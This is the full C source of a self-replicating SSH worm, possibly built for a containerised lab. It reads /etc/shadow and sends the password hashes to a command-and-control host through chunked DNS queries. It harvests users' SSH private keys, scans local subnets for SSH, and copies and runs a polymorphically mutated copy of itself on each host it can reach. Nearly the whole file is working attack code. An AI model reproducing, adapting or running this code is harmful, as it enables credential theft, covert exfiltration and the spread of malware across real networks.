#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdint.h>
#include <dirent.h>
#include <ifaddrs.h>

// Configuration
#define MAX_SUBNETS 4
#define MAX_IP_LEN 16
#define MAX_PATH_LEN 256
#define CHUNK_SIZE 4000
#define REMOTE_WORM_PATH "/tmp/worm"
#define REMOTE_B64_PATH "/tmp/worm.b64"
#define SCAN_TIMEOUT 2
#define SSH_TIMEOUT 10

#define DNS_PORT 53
#define BUF_SIZE 512
#define MAX_LABEL 50
#define C2_IP "c2"
#define C2_DOMAIN "c2"

char* SSH_KEY_PATH = NULL;
char* SSH_USER = "root";
char* SSH_KEY_LIST[100];
int SSH_KEY_COUNT = 0;
char* local_ips[10];
int local_ip_count = 0;
char* unique_networks[10];
int unique_network_count = 0;

// DNS header (RFC 1035)
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// Convierte "hola.ejemplo.com" -> formato DNS
int encode_qname(unsigned char *buf, const char *host) {
    int pos = 0;
    const char *beg = host;
    const char *p = host;

    while (*p) {
        if (*p == '.') {
            buf[pos++] = p - beg;
            memcpy(&buf[pos], beg, p - beg);
            pos += p - beg;
            beg = p + 1;
        }
        p++;
    }

    buf[pos++] = p - beg;
    memcpy(&buf[pos], beg, p - beg);
    pos += p - beg;
    buf[pos++] = 0; // fin del QNAME

    return pos;
}

// Base64 URL-safe encoding
void base64_encode_urlsafe(const unsigned char *input, int len, char *output) {
    const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    int i, j;
    
    for (i = 0, j = 0; i < len;) {
        uint32_t octet_a = i < len ? input[i++] : 0;
        uint32_t octet_b = i < len ? input[i++] : 0;
        uint32_t octet_c = i < len ? input[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        output[j++] = table[(triple >> 3 * 6) & 0x3F];
        output[j++] = table[(triple >> 2 * 6) & 0x3F];
        output[j++] = table[(triple >> 1 * 6) & 0x3F];
        output[j++] = table[(triple >> 0 * 6) & 0x3F];
    }
    
    int mod = len % 3;
    if (mod == 1) {
        j -= 2; // Remove last 2 chars
    } else if (mod == 2) {
        j -= 1; // Remove last 1 char
    }
    
    output[j] = '\0';
}

// Envía una query DNS
void send_dns_query(int sock, struct sockaddr_in *dest, const char *hostname) {
    unsigned char buf[BUF_SIZE];
    struct dns_header *dns;
    int qname_len;

    memset(buf, 0, BUF_SIZE);

    dns = (struct dns_header *) buf;
    dns->id = htons(rand() % 0xFFFF);
    dns->flags = htons(0x0100);
    dns->qdcount = htons(1);

    qname_len = encode_qname(buf + sizeof(struct dns_header), hostname);

    uint16_t *qtype = (uint16_t *)(buf + sizeof(struct dns_header) + qname_len);
    *qtype = htons(1); // A

    uint16_t *qclass = qtype + 1;
    *qclass = htons(1); // IN

    int packet_len = sizeof(struct dns_header) + qname_len + 4;

    sendto(sock, buf, packet_len, 0, (struct sockaddr *)dest, sizeof(*dest));
}

// Exfiltra mensaje por DNS
void exfiltrate(const char *message, const char *c2_ip, const char *domain) {
    printf("[*] Iniciando exfiltración DNS a %s...", c2_ip);
    int sock;
    struct sockaddr_in dest;
    // Base64 is 4/3 expansion.
    char *encoded = malloc(strlen(message) * 2 + 1); 
    if (!encoded) return;
    
    char session[16];
    char hostname[256];
    int len = strlen(message);

    // Generar ID de sesión
    unsigned long r;
    srand(time(NULL));         // Inicializa el generador de números aleatorios
    r = rand();                // Genera un número pseudoaleatorio
    snprintf(session, sizeof(session), "%lx", r);

    // Codificar mensaje en base64 url-safe
    base64_encode_urlsafe((const unsigned char*)message, len, encoded);

    // Resolver nombre/IP del C2
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    
    if (getaddrinfo(c2_ip, NULL, &hints, &res) != 0) {
        fprintf(stderr, "[!] Error resolviendo %s\n", c2_ip);
        free(encoded);
        return;
    }

    // Socket UDP
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DNS_PORT);
    dest.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    
    freeaddrinfo(res);

    // Dividir en fragmentos
    int seq = 0;
    int total_len = strlen(encoded);
    int pos = 0;

    while (pos < total_len) {
        int chunk_size = (total_len - pos > MAX_LABEL) ? MAX_LABEL : (total_len - pos);
        char chunk[MAX_LABEL + 1];
        
        strncpy(chunk, encoded + pos, chunk_size);
        chunk[chunk_size] = '\0';

        snprintf(hostname, sizeof(hostname), "%s.%d.%s.%s", session, seq, chunk, domain);
        
        printf("[DNS] Enviando fragmento %d: %s\n", seq, hostname);
        send_dns_query(sock, &dest, hostname);
        
        usleep(100000); // 100ms delay
        pos += chunk_size;
        seq++;
    }

    // Enviar señal END
    snprintf(hostname, sizeof(hostname), "%s.END.X.%s", session, domain);
    printf("[DNS] Enviando END: %s\n", hostname);
    send_dns_query(sock, &dest, hostname);

    close(sock);
    free(encoded);
    printf("[+] Exfiltración DNS completada");
}

void steal_shadow() {
    printf("[*] Attempting to steal /etc/shadow...\n");
    FILE* f = fopen("/etc/shadow", "r");
    if (!f) {
        printf("[-] Failed to open /etc/shadow: %s\n", strerror(errno));
        return;
    }
    
    // Read entire file into memory (limit 10KB for safety)
    char *buffer = malloc(10240);
    if (!buffer) {
        fclose(f);
        return;
    }
    
    size_t bytes_read = fread(buffer, 1, 10240 - 1, f);
    buffer[bytes_read] = '\0';
    fclose(f);
    
    if (bytes_read > 0) {
        // Filter lines: skip if second field (after first ':') has length <= 1
        char *filtered = malloc(10240);
        if (!filtered) {
            free(buffer);
            return;
        }
        
        char *line = strtok(buffer, "\n");
        size_t filtered_len = 0;
        
        while (line != NULL) {
            char *first_colon = strchr(line, ':');
            if (first_colon) {
                char *second_colon = strchr(first_colon + 1, ':');
                size_t second_field_len;
                
                if (second_colon) {
                    second_field_len = second_colon - (first_colon + 1);
                } else {
                    second_field_len = strlen(first_colon + 1);
                }
                
                // Only include lines where second field length > 1
                if (second_field_len > 1) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < 10240) {
                        strcpy(filtered + filtered_len, line);
                        filtered_len += line_len;
                        filtered[filtered_len++] = '\n';
                    }
                }
            }
            
            line = strtok(NULL, "\n");
        }
        
        filtered[filtered_len] = '\0';
        
        if (filtered_len > 0) {
            printf("[*] Sending %zu bytes of filtered shadow file...\n", filtered_len);
            exfiltrate(filtered, C2_IP, C2_DOMAIN);
            printf("[+] Shadow file exfiltration completed\n");
        } else {
            printf("[-] No valid entries found in /etc/shadow.\n");
        }
        
        free(filtered);
    } else {
        printf("[-] /etc/shadow is empty or could not be read.\n");
    }
    
    free(buffer);
}

// Base64 encoding table
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode function
 * Returns dynamically allocated string (caller must free)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Helper for memmem if not available or strictly standard C
 */
void *find_mem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
    if (needlelen > haystacklen) return NULL;
    if (needlelen == 0) return (void *)haystack;
    
    const char *h = haystack;
    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (memcmp(h + i, needle, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

/**
 * Polymorphic engine - adds random bytes to worm binary
 * Returns dynamically allocated modified content (caller must free)
 */
unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len) {
    // Magic marker to identify end of original binary
    const char *marker = "DEADBEEF_WORM_END";
    size_t marker_len = strlen(marker);

    // Find marker - we need the LAST occurrence because the string literal
    // itself exists in the binary's data section.
    
    unsigned char *found = NULL;
    unsigned char *current = file_content;
    unsigned char *next_found = NULL;
    
    // Find the last occurrence of the marker
    while ((next_found = find_mem(current, total_read - (current - file_content), marker, marker_len))) {
        found = next_found;
        current = found + 1;
    }

    size_t original_len = total_read;
    
    if (found) {
        size_t offset = found - file_content;
        size_t remaining = total_read - offset;
        
        // Heuristic: If the marker is found very close to the end (e.g. within last 100 bytes),
        // it's likely the appended one.
        if (remaining < (marker_len + 100)) {
            original_len = offset;
        }
    }

    // Generate random bytes
    int random_bytes_count = 10 + (rand() % 41); // 10 to 50 bytes
    
    // Calculate new size
    *new_len = original_len + marker_len + random_bytes_count;
    
    // Allocate new buffer
    unsigned char* new_content = malloc(*new_len);
    if (!new_content) {
        return NULL;
    }
    
    // Copy original content
    memcpy(new_content, file_content, original_len);
    
    // Append marker
    memcpy(new_content + original_len, marker, marker_len);
    
    // Append random bytes
    for (int i = 0; i < random_bytes_count; i++) {
        new_content[original_len + marker_len + i] = rand() % 256;
    }
    
    return new_content;
}

/**
 * Get all local IP addresses of the host (excluding loopback)
 */
void get_local_ips() {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        return;
    }
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            char *ip = inet_ntoa(addr->sin_addr);
            // Skip localhost
            if (strcmp(ip, "127.0.0.1") != 0 && local_ip_count < 10) {
                local_ips[local_ip_count] = strdup(ip);
                local_ip_count++;
            }
        }
    }
    
    freeifaddrs(ifaddr);
}
char* get_executable_path(const char* argv0) {
    char* path = malloc(PATH_MAX);
    if (!path) return NULL;
    
    // Try /proc/self/exe first (Linux)
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len != -1) {
        path[len] = '\0';
        return path;
    }
    
    // Fallback: use argv[0] if available
    if (argv0) {
        // If it's an absolute path, use it directly
        if (argv0[0] == '/') {
            return strdup(argv0);
        }
        // Otherwise, try to resolve it (simplified - just return as-is)
        return strdup(argv0);
    }
    
    free(path);
    return NULL;
}

/**
 * Read SSH private keys from user home directories .ssh/id_rsa
 * Stores found keys in global lists for later testing
 * Returns the number of keys found
 */
int read_ssh_key() {
    // First, try current user's HOME directory
    char* home = getenv("HOME");
    if (home) {
        char key_path[MAX_PATH_LEN];
        snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", home);
        
        if (access(key_path, R_OK) == 0) {
            SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);
            SSH_KEY_COUNT++;
        }
    }
    
    // Then scan all /home directories
    DIR* home_dir = opendir("/home");
    if (!home_dir) return SSH_KEY_COUNT;
    
    struct dirent* entry;
    while ((entry = readdir(home_dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        
        char user_path[MAX_PATH_LEN];
        snprintf(user_path, sizeof(user_path), "/home/%s", entry->d_name);
        
        struct stat st;
        if (stat(user_path, &st) == 0 && S_ISDIR(st.st_mode)) {
            char key_path[MAX_PATH_LEN];
            snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", user_path);
            
            if (access(key_path, R_OK) == 0) {
                // Check if already added (avoid duplicates)
                int duplicate = 0;
                for (int i = 0; i < SSH_KEY_COUNT; i++) {
                    if (strcmp(SSH_KEY_LIST[i], key_path) == 0) {
                        duplicate = 1;
                        break;
                    }
                }
                
                if (!duplicate) {
                    SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);                
                    SSH_KEY_COUNT++;
                    if (SSH_KEY_COUNT >= 100) break;
                }
            }
        }
    }
    closedir(home_dir);
    return SSH_KEY_COUNT;
}

/**
 * Scan target IP for port 22 (SSH)
 * Returns 1 if port is open, 0 otherwise
 */
int scan_target(const char* ip) {
    printf("[*] Scanning %s for port 22 (SSH)...\n", ip);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("[-] Error creating socket: %s\n", strerror(errno));
        return 0;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(22);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("[-] Error converting IP address\n");
        close(sock);
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = SCAN_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Execute command via SSH
 * Returns 1 on success, 0 on failure
 */
int run_ssh_command(const char* ip, const char* command) {
    char ssh_cmd[4096];
    snprintf(ssh_cmd, sizeof(ssh_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s %s@%s '%s' 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, SSH_USER, ip, command);
    
    int result = system(ssh_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Transfer file via SCP
 * Returns 1 on success, 0 on failure
 */
int scp_transfer(const char* ip, const char* local_file, const char* remote_file) {
    char scp_cmd[4096];
    snprintf(scp_cmd, sizeof(scp_cmd),
        "scp -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s %s %s@%s:%s 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, local_file, SSH_USER, ip, remote_file);
    
    int result = system(scp_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Infect target by uploading and executing this worm via SSH
 * Returns 1 on success, 0 on failure
 */
int infect_target(const char* ip, const char* argv0) {
    if (!scan_target(ip)) {
        return 0;
    }
    
    printf("[+] SSH Server found at %s!\n", ip);
    
    // Find a working SSH key for this IP
    int found_key = 0;
    for (int i = 0; i < SSH_KEY_COUNT; i++) {
        char ssh_cmd[4096];
        snprintf(ssh_cmd, sizeof(ssh_cmd),
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
            "-i %s %s@%s 'true' >/dev/null 2>&1",
            SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER, ip);
        
        int result = system(ssh_cmd);
        if (result == 0) {
            SSH_KEY_PATH = SSH_KEY_LIST[i];
            printf("[+] Using SSH key for user %s on %s\n", SSH_USER, ip);
            found_key = 1;
            break;
        }
    }
    
    if (!found_key) {
        printf("[-] No working SSH key found for %s\n", ip);
        return 0;
    }
    
    printf("[*] Attempting infection on %s via SSH...\n", ip);
    
    // 1. Read own binary -> Self-replication
    // Try to read from memfd file descriptor first (if passed via environment)
    unsigned char* worm_content = NULL;
    size_t file_size = 0;
    int fd = -1;
    
    // Check if memfd fd was passed via environment variable
    char* fd_str = getenv("MEMFD_FD");
    if (fd_str) {
        fd = atoi(fd_str);
        printf("[*] Reading from memfd file descriptor: %d\n", fd);
        
        // Verify fd is valid
        if (fcntl(fd, F_GETFD) == -1) {
            printf("[-] Invalid file descriptor: %d\n", fd);
            fd = -1;
        } else {
            // Get file size using lseek
            off_t size = lseek(fd, 0, SEEK_END);
            if (size < 0) {
                printf("[-] Error getting file size from fd: %s\n", strerror(errno));
                fd = -1;
            } else {
                file_size = (size_t)size;
                lseek(fd, 0, SEEK_SET);  // Reset to beginning
                
                // Read from file descriptor
                worm_content = malloc(file_size);
                if (!worm_content) {
                    printf("[-] Memory allocation failed\n");
                    fd = -1;
                } else {
                    ssize_t bytes_read = read(fd, worm_content, file_size);
                    if (bytes_read < 0 || (size_t)bytes_read != file_size) {
                        printf("[-] Error reading from fd: %s\n", strerror(errno));
                        free(worm_content);
                        worm_content = NULL;
                        fd = -1;
                    } else {
                        printf("[+] Successfully read %zu bytes from memfd\n", file_size);
                    }
                }
            }
        }
    }
    
    // Fallback: Read from /proc/self/exe (for temp file or normal execution)
    if (!worm_content) {
        printf("[*] Falling back to reading from /proc/self/exe\n");
        char* exe_path = get_executable_path(argv0);
        if (!exe_path) {
            printf("[-] Could not determine executable path, trying /proc/self/exe\n");
            exe_path = strdup("/proc/self/exe");
        }
        
        FILE* f = fopen(exe_path, "rb");
        if (!f) {
            printf("[-] Error reading own binary: %s\n", strerror(errno));
            free(exe_path);
            return 0;
        }
        
        // Get file size
        fseek(f, 0, SEEK_END);
        long file_size_long = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (file_size_long < 0) {
            printf("[-] Error getting file size\n");
            fclose(f);
            free(exe_path);
            return 0;
        }
        
        file_size = (size_t)file_size_long;
        
        // Read file
        worm_content = malloc(file_size);
        if (!worm_content) {
            fclose(f);
            free(exe_path);
            return 0;
        }
        
        size_t bytes_read = fread(worm_content, 1, file_size, f);
        fclose(f);
        free(exe_path);
        
        if (bytes_read != file_size) {
            printf("[-] Error reading binary: incomplete read\n");
            free(worm_content);
            return 0;
        }
        
        printf("[+] Successfully read %zu bytes from file\n", file_size);
    }
    
    // Apply polymorphic mutation to create unique variant
    printf("[*] Applying polymorphic mutation...\n");
    size_t mutated_size;
    unsigned char* mutated_content = polimorfism(worm_content, file_size, &mutated_size);
    free(worm_content);
    
    if (!mutated_content) {
        printf("[-] Error applying polymorphic mutation\n");
        return 0;
    }
    
    printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
    
    // Write mutated content to temporary file
    const char* temp_worm = "/tmp/worm_temp";
    FILE* temp_f = fopen(temp_worm, "wb");
    if (!temp_f) {
        printf("[-] Error creating temporary file\n");
        free(mutated_content);
        return 0;
    }
    
    fwrite(mutated_content, 1, mutated_size, temp_f);
    fclose(temp_f);
    free(mutated_content);
    
    // Make temp file executable
    chmod(temp_worm, 0755);
    
    // 2. Check if already infected
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo 'EXISTS'", REMOTE_WORM_PATH);
    
    char result_file[256];
    snprintf(result_file, sizeof(result_file), "/tmp/check_%s.txt", ip);
    
    char check_full_cmd[1024];
    snprintf(check_full_cmd, sizeof(check_full_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s %s@%s '%s' > %s 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, SSH_USER, ip, check_cmd, result_file);
    
    system(check_full_cmd);
    
    FILE* check_f = fopen(result_file, "r");
    if (check_f) {
        char check_result[64];
        if (fgets(check_result, sizeof(check_result), check_f)) {
            if (strstr(check_result, "EXISTS")) {
                printf("[*] Target %s already infected.\n", ip);
                fclose(check_f);
                unlink(result_file);
                unlink(temp_worm);
                return 1;
            }
        }
        fclose(check_f);
        unlink(result_file);
    }
    
    // 3. Transfer worm via SCP
    printf("[*] Transferring worm to %s via SCP...\n", ip);
    if (!scp_transfer(ip, temp_worm, REMOTE_WORM_PATH)) {
        printf("[-] Error transferring worm to %s\n", ip);
        unlink(temp_worm);
        return 0;
    }
    
    // Clean up local temp file (after successful transfer)
    unlink(temp_worm);
    
    // 4. Make executable on remote
    printf("[*] Setting executable permissions on remote...\n");
    char chmod_cmd[512];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", REMOTE_WORM_PATH);
    run_ssh_command(ip, chmod_cmd);
    
    // 5. Execute worm on remote
    printf("[+] Executing worm on %s...\n", ip);
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
    run_ssh_command(ip, exec_cmd);
    
    printf("[+] Infection complete for %s\n", ip);
    return 1;
}



void get_net_24(const char *ip, char *out) {
    strcpy(out, ip);
    char *last_dot = strrchr(out, '.');
    if (last_dot) {
        strcpy(last_dot, ".0/24");
    }
}


int main(int argc, char* argv[]) {
    (void)argc;  // Suppress unused parameter warning
    printf("=== C SSH Key-Based Worm ===\n");
    
    // Initialize random seed for polymorphic engine
    srand(time(NULL));
    
    // Delay to allow system to settle if just started
    sleep(2);

    // PHASE 1: Priviledge escalation

    // Attempt privilege escalation on spoke servers (before SSH key check)
    // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
    // This works better than hostname checking since Docker containers have random hostnames


    //PHASE 2: Data exfiltration and infection
    printf("\n[*] Phase 2: Data Exfiltration\n");
    steal_shadow();

    // Check if SSH keys exist
    int keys_found = read_ssh_key();
    if (keys_found == 0) {
        printf("[-] No SSH keys found. Exiting...\n");
        return 1;
    } else {
        printf("[+] Found %d SSH key(s)\n", keys_found);
    }
    
    // Get local IPs and determine networks to scan
    get_local_ips();
    if (local_ip_count == 0) {
        printf("[-] Could not determine local IPs. Exiting...\n");
        return 1;
    }
    
    // Collect unique /24 networks
    for (int i = 0; i < local_ip_count; i++) {
        char network[INET_ADDRSTRLEN];
        strcpy(network, local_ips[i]);
        char *last_dot = strrchr(network, '.');
        if (last_dot) {
            strcpy(last_dot + 1, "0");
        } else {
            strcpy(network, "0.0.0.0");
        }
        
        // Check if already in unique_networks
        int found = 0;
        for (int j = 0; j < unique_network_count; j++) {
            if (strcmp(unique_networks[j], network) == 0) {
                found = 1;
                break;
            }
        }
        
        if (!found && unique_network_count < 10) {
            unique_networks[unique_network_count] = strdup(network);
            unique_network_count++;
        }
        
        free(local_ips[i]);
    }
    
    printf("[+] Found %d local IP(s), scanning %d unique network(s)\n", local_ip_count, unique_network_count);    // Infection loop
        printf("\n[*] Starting infection round...\n");
        
        // Scan all unique networks
        for (int net_idx = 0; net_idx < unique_network_count; net_idx++) {
            char* network = unique_networks[net_idx];
            char base_network[INET_ADDRSTRLEN];
            strncpy(base_network, network, strlen(network) - 2);
            base_network[strlen(network) - 2] = '\0';
            printf("[+] Scanning network: %s/24\n", network);
            
            for (int host = 1; host <= 10; host++) {
                char ip[MAX_IP_LEN];
                snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
                
                infect_target(ip, argv[0]);
            }
        }
    sleep(30);
    return 0;
}